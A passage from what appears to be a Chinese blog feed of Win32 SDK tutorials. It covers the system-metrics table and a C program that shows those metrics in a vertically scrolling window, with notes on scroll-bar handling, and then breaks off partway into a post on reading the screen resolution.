                     TEXT (<span class="string">&quot;Mouse present flag&quot;</span>),</span><br><span class="line">     SM_CYVSCROLL,            TEXT (<span class="string">&quot;SM_CYVSCROLL&quot;</span>),             </span><br><span class="line">                              TEXT (<span class="string">&quot;Vertical scroll arrow height&quot;</span>),</span><br><span class="line">     SM_CXHSCROLL,            TEXT (<span class="string">&quot;SM_CXHSCROLL&quot;</span>),             </span><br><span class="line">                              TEXT (<span class="string">&quot;Horizontal scroll arrow width&quot;</span>),</span><br><span class="line">     SM_DEBUG,                TEXT (<span class="string">&quot;SM_DEBUG&quot;</span>),                 </span><br><span class="line">                              TEXT (<span class="string">&quot;Debug version flag&quot;</span>),</span><br><span class="line">     SM_SWAPBUTTON,           TEXT (<span class="string">&quot;SM_SWAPBUTTON&quot;</span>),            </span><br><span class="line">                              TEXT (<span class="string">&quot;Mouse buttons swapped flag&quot;</span>),</span><br><span class="line">     SM_CXMIN,                TEXT (<span class="string">&quot;SM_CXMIN&quot;</span>),                 </span><br><span class="line">                              TEXT (<span class="string">&quot;Minimum window width&quot;</span>),</span><br><span class="line">     SM_CYMIN,                TEXT (<span class="string">&quot;SM_CYMIN&quot;</span>),                 </span><br><span class="line">                              TEXT (<span class="string">&quot;Minimum window height&quot;</span>),</span><br><span class="line">     SM_CXSIZE,               TEXT (<span class="string">&quot;SM_CXSIZE&quot;</span>),                </span><br><span class="line">                              TEXT (<span class="string">&quot;Min/Max/Close button width&quot;</span>),</span><br><span class="line">     SM_CYSIZE,               TEXT (<span class="string">&quot;SM_CYSIZE&quot;</span>),                </span><br><span class="line">                              TEXT (<span class="string">&quot;Min/Max/Close button height&quot;</span>),</span><br><span class="line">     SM_CXSIZEFRAME,          TEXT (<span class="string">&quot;SM_CXSIZEFRAME&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Window sizing frame width&quot;</span>),</span><br><span class="line">     SM_CYSIZEFRAME,          TEXT (<span class="string">&quot;SM_CYSIZEFRAME&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Window sizing frame height&quot;</span>),</span><br><span class="line">     SM_CXMINTRACK,           TEXT (<span class="string">&quot;SM_CXMINTRACK&quot;</span>),            </span><br><span class="line">                              TEXT (<span class="string">&quot;Minimum window tracking width&quot;</span>),</span><br><span class="line">     SM_CYMINTRACK,           TEXT (<span class="string">&quot;SM_CYMINTRACK&quot;</span>),            </span><br><span class="line">                              TEXT (<span class="string">&quot;Minimum window tracking height&quot;</span>),</span><br><span class="line">     SM_CXDOUBLECLK,          TEXT (<span class="string">&quot;SM_CXDOUBLECLK&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Double click x tolerance&quot;</span>),</span><br><span class="line">     SM_CYDOUBLECLK,          TEXT (<span class="string">&quot;SM_CYDOUBLECLK&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Double click y tolerance&quot;</span>),</span><br><span class="line">     SM_CXICONSPACING,        TEXT (<span class="string">&quot;SM_CXICONSPACING&quot;</span>),         </span><br><span class="line">                              TEXT (<span class="string">&quot;Horizontal icon spacing&quot;</span>),</span><br><span class="line">     SM_CYICONSPACING,        TEXT (<span class="string">&quot;SM_CYICONSPACING&quot;</span>),         </span><br><span class="line">                              TEXT (<span class="string">&quot;Vertical icon spacing&quot;</span>),</span><br><span class="line">     SM_MENUDROPALIGNMENT,    TEXT (<span class="string">&quot;SM_MENUDROPALIGNMENT&quot;</span>),     </span><br><span class="line">                              TEXT (<span class="string">&quot;Left or right menu drop&quot;</span>),</span><br><span class="line">     SM_PENWINDOWS,           TEXT (<span class="string">&quot;SM_PENWINDOWS&quot;</span>),            </span><br><span class="line">                              TEXT (<span class="string">&quot;Pen extensions installed&quot;</span>),</span><br><span class="line">     SM_DBCSENABLED,          TEXT (<span class="string">&quot;SM_DBCSENABLED&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Double-Byte Char Set enabled&quot;</span>),</span><br><span class="line">     SM_CMOUSEBUTTONS,        TEXT (<span class="string">&quot;SM_CMOUSEBUTTONS&quot;</span>),         </span><br><span class="line">                              TEXT (<span class="string">&quot;Number of mouse buttons&quot;</span>),</span><br><span class="line">     SM_SECURE,               TEXT (<span class="string">&quot;SM_SECURE&quot;</span>),                </span><br><span class="line">                              TEXT (<span class="string">&quot;Security present flag&quot;</span>),</span><br><span class="line">     SM_CXEDGE,               TEXT (<span class="string">&quot;SM_CXEDGE&quot;</span>),                </span><br><span class="line">                              TEXT (<span class="string">&quot;3-D border width&quot;</span>),</span><br><span class="line">     SM_CYEDGE,               TEXT (<span class="string">&quot;SM_CYEDGE&quot;</span>),                </span><br><span class="line">                              TEXT (<span class="string">&quot;3-D border height&quot;</span>),</span><br><span class="line">     SM_CXMINSPACING,         TEXT (<span class="string">&quot;SM_CXMINSPACING&quot;</span>),          </span><br><span class="line">                              TEXT (<span class="string">&quot;Minimized window spacing width&quot;</span>),</span><br><span class="line">     SM_CYMINSPACING,         TEXT (<span class="string">&quot;SM_CYMINSPACING&quot;</span>),          </span><br><span class="line">                              TEXT (<span class="string">&quot;Minimized window spacing height&quot;</span>),</span><br><span class="line">     SM_CXSMICON,             TEXT (<span class="string">&quot;SM_CXSMICON&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Small icon width&quot;</span>),</span><br><span class="line">     SM_CYSMICON,             TEXT (<span class="string">&quot;SM_CYSMICON&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Small icon height&quot;</span>),</span><br><span class="line">     SM_CYSMCAPTION,          TEXT (<span class="string">&quot;SM_CYSMCAPTION&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Small caption height&quot;</span>),</span><br><span class="line">     SM_CXSMSIZE,             TEXT (<span class="string">&quot;SM_CXSMSIZE&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Small caption button width&quot;</span>),</span><br><span class="line">     SM_CYSMSIZE,             TEXT (<span class="string">&quot;SM_CYSMSIZE&quot;</span>),              </span><br><span class="line">                              TEXT (<span class="string">&quot;Small caption button height&quot;</span>),</span><br><span class="line">     SM_CXMENUSIZE,           TEXT (<span class="string">&quot;SM_CXMENUSIZE&quot;</span>),            </span><br><span class="line">                              TEXT (<span class="string">&quot;Menu bar button width&quot;</span>),</span><br><span class="line">     SM_CYMENUSIZE,           TEXT (<span class="string">&quot;SM_CYMENUSIZE&quot;</span>),            </span><br><span class="line">                              TEXT (<span class="string">&quot;Menu bar button height&quot;</span>),</span><br><span class="line">     SM_ARRANGE,              TEXT (<span class="string">&quot;SM_ARRANGE&quot;</span>),               </span><br><span class="line">                              TEXT (<span class="string">&quot;How minimized windows arranged&quot;</span>),</span><br><span class="line">     SM_CXMINIMIZED,          TEXT (<span class="string">&quot;SM_CXMINIMIZED&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Minimized window width&quot;</span>),</span><br><span class="line">     SM_CYMINIMIZED,          TEXT (<span class="string">&quot;SM_CYMINIMIZED&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Minimized window height&quot;</span>),</span><br><span class="line">     SM_CXMAXTRACK,           TEXT (<span class="string">&quot;SM_CXMAXTRACK&quot;</span>),            </span><br><span class="line">                              TEXT (<span class="string">&quot;Maximum draggable width&quot;</span>),</span><br><span class="line">     SM_CYMAXTRACK,           TEXT (<span class="string">&quot;SM_CYMAXTRACK&quot;</span>),            </span><br><span class="line">                              TEXT (<span class="string">&quot;Maximum draggable height&quot;</span>),</span><br><span class="line">     SM_CXMAXIMIZED,          TEXT (<span class="string">&quot;SM_CXMAXIMIZED&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Width of maximized window&quot;</span>),</span><br><span class="line">     SM_CYMAXIMIZED,          TEXT (<span class="string">&quot;SM_CYMAXIMIZED&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Height of maximized window&quot;</span>),</span><br><span class="line">     SM_NETWORK,              TEXT (<span class="string">&quot;SM_NETWORK&quot;</span>),               </span><br><span class="line">                              TEXT (<span class="string">&quot;Network present flag&quot;</span>),</span><br><span class="line">     SM_CLEANBOOT,            TEXT (<span class="string">&quot;SM_CLEANBOOT&quot;</span>),             </span><br><span class="line">                              TEXT (<span class="string">&quot;How system was booted&quot;</span>),</span><br><span class="line">     SM_CXDRAG,               TEXT (<span class="string">&quot;SM_CXDRAG&quot;</span>),                </span><br><span class="line">                              TEXT (<span class="string">&quot;Avoid drag x tolerance&quot;</span>),</span><br><span class="line">     SM_CYDRAG,               TEXT (<span class="string">&quot;SM_CYDRAG&quot;</span>),                </span><br><span class="line">                              TEXT (<span class="string">&quot;Avoid drag y tolerance&quot;</span>),</span><br><span class="line">     SM_SHOWSOUNDS,           TEXT (<span class="string">&quot;SM_SHOWSOUNDS&quot;</span>),            </span><br><span class="line">                              TEXT (<span class="string">&quot;Present sounds visually&quot;</span>),</span><br><span class="line">     SM_CXMENUCHECK,          TEXT (<span class="string">&quot;SM_CXMENUCHECK&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Menu check-mark width&quot;</span>),</span><br><span class="line">     SM_CYMENUCHECK,          TEXT (<span class="string">&quot;SM_CYMENUCHECK&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Menu check-mark height&quot;</span>),</span><br><span class="line">     SM_SLOWMACHINE,          TEXT (<span class="string">&quot;SM_SLOWMACHINE&quot;</span>),           </span><br><span class="line">                              TEXT (<span class="string">&quot;Slow processor flag&quot;</span>),</span><br><span class="line">     SM_MIDEASTENABLED,       TEXT (<span class="string">&quot;SM_MIDEASTENABLED&quot;</span>),        </span><br><span class="line">                              TEXT (<span class="string">&quot;Hebrew and Arabic enabled flag&quot;</span>),</span><br><span class="line">     SM_MOUSEWHEELPRESENT,    TEXT (<span class="string">&quot;SM_MOUSEWHEELPRESENT&quot;</span>),     </span><br><span class="line">                              TEXT (<span class="string">&quot;Mouse wheel present flag&quot;</span>),</span><br><span class="line">     SM_XVIRTUALSCREEN,       TEXT (<span class="string">&quot;SM_XVIRTUALSCREEN&quot;</span>),        </span><br><span class="line">                              TEXT (<span class="string">&quot;Virtual screen x origin&quot;</span>),</span><br><span class="line">     SM_YVIRTUALSCREEN,       TEXT (<span class="string">&quot;SM_YVIRTUALSCREEN&quot;</span>),        </span><br><span class="line">                              TEXT (<span class="string">&quot;Virtual screen y origin&quot;</span>),</span><br><span class="line">     SM_CXVIRTUALSCREEN,      TEXT (<span class="string">&quot;SM_CXVIRTUALSCREEN&quot;</span>),       </span><br><span class="line">                              TEXT (<span class="string">&quot;Virtual screen width&quot;</span>),</span><br><span class="line">     SM_CYVIRTUALSCREEN,      TEXT (<span class="string">&quot;SM_CYVIRTUALSCREEN&quot;</span>),       </span><br><span class="line">                              TEXT (<span class="string">&quot;Virtual screen height&quot;</span>),</span><br><span class="line">     SM_CMONITORS,            TEXT (<span class="string">&quot;SM_CMONITORS&quot;</span>),             </span><br><span class="line">                              TEXT (<span class="string">&quot;Number of monitors&quot;</span>),</span><br><span class="line">     SM_SAMEDISPLAYFORMAT,    TEXT (<span class="string">&quot;SM_SAMEDISPLAYFORMAT&quot;</span>),     </span><br><span class="line">                              TEXT (<span class="string">&quot;Same color format flag&quot;</span>)</span><br><span class="line">&#125; ;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="程序文件："><a href="#程序文件：" class="headerlink" title="程序文件："></a>程序文件：</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>Windows 负责：</p><ul><li>处理滚动条中的所有鼠标消息</li><li>当用户单击滚动条时，提供一种反向显示的闪烁</li><li>当用户拖动滑块时，在滚动条内移动滑块</li><li>向拥有滚动条的窗口的窗口过程发送滚动条消</li></ul><p>代码需要负责：</p><ul><li>初始化滚动条的范围和位置</li><li>处理传送给窗口过程的滚动条消息</li><li>更新滑块的位置</li><li>根据滚动条的变化更新客户区的内容</li></ul><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p><strong>1. 使用 <a href="http://bbs.fishc.com/thread-50269-1-1.html">SetScrollRange</a> 函数来设置滚动条的范围</strong></p><p><code>ps</code>：这里所说的范围是指滑块的位置所能移动的范围，例如一个范围是 0~100 的滚动条，那么它的滑块就有 101 个位置可以移动。</p><p><strong>2.  <a href="http://bbs.fishc.com/thread-49474-1-1.html">TextOut</a> 函数的第三个参数决定文本显示的位置</strong></p><p><strong>3. 如何看待滚动条</strong></p><p>当用户拉动滚动条向下滚动时，他们希望是看到文件中下方的内容。而我们设计程序，则是需要将文件相对于窗口向上移动。从这个角度来说，是<strong>相反</strong>的。</p><p><strong>4. 需要系统发送 WM_PAINT 消息重绘窗口，可以使用 <a href="http://bbs.fishc.com/thread-50513-1-1.html">InvalidateRect</a> 函数使得客户区失效</strong></p><p><code>ps</code>：使用 <a href="http://bbs.fishc.com/thread-50513-1-1.html">InvalidateRect</a> 使客户区失效，Windows 会在应用程序的消息队列为空的时候才发送 WM_PAINT 消息，也就意味着，如果你的程序很忙，那么刷新这一操作就会有所延迟，那么客户看到的就可能是程序一卡一卡的。因此，如果你想<strong>立刻更新</strong>无效区域，则可以在调用 <a href="http://bbs.fishc.com/thread-50513-1-1.html">InvalidateRect</a> 函数后随即调用 <a href="http://bbs.fishc.com/thread-47210-1-1.html">UpdateWindow</a> 函数。因为如果客户区有任何一部分是无效的，<a href="http://bbs.fishc.com/thread-47210-1-1.html">UpdateWindow</a> 函数将绕过消息队列，直接给窗口过程发一个 WM_PAINT 消息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;strsafe.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysmets.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> TCHAR szAppName[] = TEXT(<span class="string">&quot;MyWindows&quot;</span>);</span><br><span class="line">HWND hwnd;</span><br><span class="line">MSG msg;</span><br><span class="line">WNDCLASS wndclass;</span><br><span class="line"></span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">wndclass.lpfnWndProc = WndProc;</span><br><span class="line">wndclass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.hInstance = hInstance;</span><br><span class="line">wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);</span><br><span class="line">wndclass.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wndclass.lpszClassName = szAppName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;这个程序需要在 Windows NT 才能执行！&quot;</span>), szAppName, MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hwnd = CreateWindow(szAppName,</span><br><span class="line">TEXT(<span class="string">&quot;快乐小凳凳&quot;</span>),</span><br><span class="line">WS_OVERLAPPEDWINDOW | WS_VSCROLL,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">hInstance,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">ShowWindow(hwnd, iCmdShow);</span><br><span class="line">UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">HDC hdc;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">TEXTMETRIC tm;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> cxChar, cxCaps, cyChar, cxClient, cyClient, iVscrollPos;</span><br><span class="line"><span class="type">size_t</span> iTarget;</span><br><span class="line"><span class="type">int</span> i, y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">hdc = GetDC(hwnd);</span><br><span class="line"></span><br><span class="line">GetTextMetrics(hdc, &amp;tm);</span><br><span class="line">cxChar = tm.tmAveCharWidth;</span><br><span class="line">cxCaps = (tm.tmPitchAndFamily &amp; <span class="number">1</span> ? <span class="number">3</span> : <span class="number">2</span>) * cxChar / <span class="number">2</span>;</span><br><span class="line">cyChar = tm.tmHeight + tm.tmExternalLeading;</span><br><span class="line"></span><br><span class="line">ReleaseDC(hwnd, hdc);</span><br><span class="line"></span><br><span class="line">SetScrollRange(hwnd, SB_VERT, <span class="number">0</span>, NUMLINES - <span class="number">1</span>, FALSE);</span><br><span class="line">SetScrollPos(hwnd, SB_VERT, <span class="number">0</span>, TRUE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">cxClient = LOWORD(lParam);</span><br><span class="line">cyClient = HIWORD(lParam);</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_VSCROLL:</span><br><span class="line">hdc = GetDC(hwnd);</span><br><span class="line">SetTextAlign(hdc, TA_TOP | TA_RIGHT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (LOWORD(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> SB_LINEUP:</span><br><span class="line">iVscrollPos -= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> SB_LINEDOWN:</span><br><span class="line">iVscrollPos += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> SB_PAGEUP:</span><br><span class="line">iVscrollPos -= cyClient / cyChar;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> SB_PAGEDOWN:</span><br><span class="line">iVscrollPos += cyClient / cyChar;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> SB_THUMBPOSITION:</span><br><span class="line">iVscrollPos = HIWORD(wParam);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReleaseDC(hwnd, hdc);</span><br><span class="line"></span><br><span class="line">iVscrollPos = max(<span class="number">0</span>, min(iVscrollPos, NUMLINES - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (iVscrollPos != GetScrollPos(hwnd, SB_VERT))</span><br><span class="line">&#123;</span><br><span class="line">SetScrollPos(hwnd, SB_VERT, iVscrollPos, TRUE);</span><br><span class="line">InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE);</span><br><span class="line">UpdateWindow(hwnd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMLINES; i++)</span><br><span class="line">&#123;</span><br><span class="line">y = cyChar * (i - iVscrollPos);</span><br><span class="line"></span><br><span class="line">StringCchLength(sysmetrics[i].szLabel, <span class="number">1024</span>, &amp;iTarget);</span><br><span class="line">TextOut(hdc, <span class="number">0</span>, y, sysmetrics[i].szLabel, iTarget);</span><br><span class="line"></span><br><span class="line">StringCchLength(sysmetrics[i].szDesc, <span class="number">1024</span>, &amp;iTarget);</span><br><span class="line">TextOut(hdc, <span class="number">22</span> * cxCaps, y, sysmetrics[i].szDesc, iTarget);</span><br><span class="line"></span><br><span class="line">SetTextAlign(hdc, TA_RIGHT | TA_TOP);</span><br><span class="line">StringCchPrintf(szBuffer, <span class="number">10</span>, TEXT(<span class="string">&quot;%5d&quot;</span>), GetSystemMetrics(sysmetrics[i].iIndex));</span><br><span class="line">StringCchLength(szBuffer, <span class="number">10</span>, &amp;iTarget);</span><br><span class="line">TextOut(hdc, <span class="number">22</span> * cxCaps + <span class="number">40</span> * cxChar, y, szBuffer, iTarget);</span><br><span class="line"></span><br><span class="line">SetTextAlign(hdc, TA_LEFT | TA_TOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EndPaint(hwnd, &amp;ps);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WinSDK </category>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinSDK程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取设备分辨率</title>
      <link href="/post/a8660f0b.html"/>
      <url>/post/a8660f0b.html</url>
      
        <content type="html"><![CDATA[<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p><strong>利用<code>GetSystemMetrics</code>函数获取设备尺寸：</strong></p><ol><li><p><code>GetSystemMetrics(SM_CXSCREEN)</code>返回设备宽度(px)</p></li><li><p><code>GetSystemMetrics(SM_CYSCREEN);</code>返回设备高度(px)</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strsafe.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> TCHAR szAppName[] = TEXT(<span class="string">&quot;MyWindows&quot;</span>);<span class="comment">// 注意使用TEXT包裹语句</span></span><br><span class="line">HWND hwnd;<span class="comment">// 窗口句柄</span></span><br><span class="line">MSG msg;<span class="comment">// 消息结构</span></span><br><span class="line">WNDCLASS wndclass;<span class="comment">// 窗口类, 定义窗口基本属性</span></span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;<span class="comment">// CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘</span></span><br><span class="line">wndclass.lpfnWndProc = WndProc;<span class="comment">// 